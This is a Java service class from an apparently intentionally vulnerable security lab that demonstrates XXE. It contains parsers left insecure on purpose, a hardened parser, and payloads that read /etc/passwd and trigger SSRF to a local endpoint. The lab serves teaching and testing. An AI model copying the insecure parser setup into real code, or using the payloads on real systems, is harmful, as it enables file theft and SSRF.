package com.owaspvulnlab.vulnerability.xxe;

import org.dom4j.Document;
import org.dom4j.DocumentHelper;
import org.dom4j.Element;
import org.dom4j.io.SAXReader;
import org.springframework.stereotype.Service;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import java.io.ByteArrayInputStream;
import java.io.StringReader;
import java.util.HashMap;
import java.util.Map;

@Service
public class XxeService {

    /**
     * 易受XXE攻击的XML解析方法 - 使用DOM4J
     */
    public Map<String, Object> vulnerableParseWithDom4j(String xmlContent) {
        Map<String, Object> result = new HashMap<>();
        
        try {
            result.put("parser", "DOM4J");
            result.put("input_xml", xmlContent);
            result.put("type", "Vulnerable XXE");
            
            // 危险：使用默认配置的SAXReader，允许外部实体
            SAXReader reader = new SAXReader();
            Document document = reader.read(new StringReader(xmlContent));
            
            Element root = document.getRootElement();
            String rootName = root.getName();
            String rootText = root.getTextTrim();
            
            result.put("success", true);
            result.put("root_element", rootName);
            result.put("root_text", rootText);
            result.put("parsed_content", document.asXML());
            result.put("description", "危险：使用默认配置解析XML，允许外部实体引用");
            
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
            result.put("description", "XML解析失败: " + e.getMessage());
        }
        
        return result;
    }

    /**
     * 易受XXE攻击的XML解析方法 - 使用DocumentBuilder
     */
    public Map<String, Object> vulnerableParseWithDocumentBuilder(String xmlContent) {
        Map<String, Object> result = new HashMap<>();
        
        try {
            result.put("parser", "DocumentBuilder");
            result.put("input_xml", xmlContent);
            result.put("type", "Vulnerable XXE");
            
            // 危险：使用默认配置的DocumentBuilder，允许外部实体
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = factory.newDocumentBuilder();
            
            org.w3c.dom.Document document = builder.parse(
                new ByteArrayInputStream(xmlContent.getBytes())
            );
            
            org.w3c.dom.Element root = document.getDocumentElement();
            String rootName = root.getNodeName();
            String rootText = root.getTextContent();
            
            result.put("success", true);
            result.put("root_element", rootName);
            result.put("root_text", rootText);
            result.put("description", "危险：使用默认配置解析XML，允许外部实体引用");
            
            // 获取所有子节点信息
            NodeList children = root.getChildNodes();
            StringBuilder childrenInfo = new StringBuilder();
            for (int i = 0; i < children.getLength(); i++) {
                org.w3c.dom.Node child = children.item(i);
                if (child.getNodeType() == org.w3c.dom.Node.ELEMENT_NODE) {
                    childrenInfo.append(child.getNodeName()).append(": ")
                              .append(child.getTextContent()).append("\n");
                }
            }
            result.put("children_info", childrenInfo.toString());
            
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
            result.put("description", "XML解析失败: " + e.getMessage());
        }
        
        return result;
    }

    /**
     * 安全的XML解析方法
     */
    public Map<String, Object> safeParseXml(String xmlContent) {
        Map<String, Object> result = new HashMap<>();
        
        try {
            result.put("parser", "Secure DocumentBuilder");
            result.put("input_xml", xmlContent);
            result.put("type", "Safe XXE Protection");
            
            // 安全：禁用外部实体和DTD处理
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            
            // 禁用外部实体
            factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
            factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
            factory.setXIncludeAware(false);
            factory.setExpandEntityReferences(false);
            
            DocumentBuilder builder = factory.newDocumentBuilder();
            org.w3c.dom.Document document = builder.parse(
                new ByteArrayInputStream(xmlContent.getBytes())
            );
            
            org.w3c.dom.Element root = document.getDocumentElement();
            String rootName = root.getNodeName();
            String rootText = root.getTextContent();
            
            result.put("success", true);
            result.put("root_element", rootName);
            result.put("root_text", rootText);
            result.put("description", "安全：已禁用外部实体和DTD处理");
            
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
            result.put("description", "安全XML解析失败: " + e.getMessage());
        }
        
        return result;
    }

    /**
     * 模拟文件读取XXE攻击
     */
    public Map<String, Object> simulateFileReadAttack() {
        Map<String, Object> result = new HashMap<>();
        
        String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE root [\n" +
                "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                "]>\n" +
                "<root>\n" +
                "  <data>&xxe;</data>\n" +
                "</root>";
        
        result.put("attack_type", "File Read XXE");
        result.put("malicious_xml", maliciousXml);
        result.put("description", "尝试读取系统文件 /etc/passwd");
        
        // 使用易受攻击的解析器
        Map<String, Object> parseResult = vulnerableParseWithDom4j(maliciousXml);
        result.put("parse_result", parseResult);
        
        return result;
    }

    /**
     * 模拟SSRF XXE攻击
     */
    public Map<String, Object> simulateSsrfAttack() {
        Map<String, Object> result = new HashMap<>();
        
        String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE root [\n" +
                "  <!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/api/xxe/info\">\n" +
                "]>\n" +
                "<root>\n" +
                "  <data>&xxe;</data>\n" +
                "</root>";
        
        result.put("attack_type", "SSRF XXE");
        result.put("malicious_xml", maliciousXml);
        result.put("description", "尝试通过XXE发起SSRF攻击");
        
        // 使用易受攻击的解析器
        Map<String, Object> parseResult = vulnerableParseWithDocumentBuilder(maliciousXml);
        result.put("parse_result", parseResult);
        
        return result;
    }

    /**
     * 生成测试XML
     */
    public Map<String, Object> generateTestXml() {
        String normalXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<user>\n" +
                "  <name>John Doe</name>\n" +
                "  <email>john@example.com</email>\n" +
                "  <role>admin</role>\n" +
                "</user>";
        
        String xxeXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE user [\n" +
                "  <!ENTITY file SYSTEM \"file:///etc/passwd\">\n" +
                "  <!ENTITY ssrf SYSTEM \"http://127.0.0.1:8080/api/xxe/info\">\n" +
                "]>\n" +
                "<user>\n" +
                "  <name>John Doe</name>\n" +
                "  <email>john@example.com</email>\n" +
                "  <role>admin</role>\n" +
                "  <secret>&file;</secret>\n" +
                "  <data>&ssrf;</data>\n" +
                "</user>";
        
        Map<String, Object> result = new HashMap<>();
        result.put("normal_xml", normalXml);
        result.put("xxe_xml", xxeXml);
        result.put("description", "正常XML和包含XXE攻击的XML示例");
        return result;
    }
}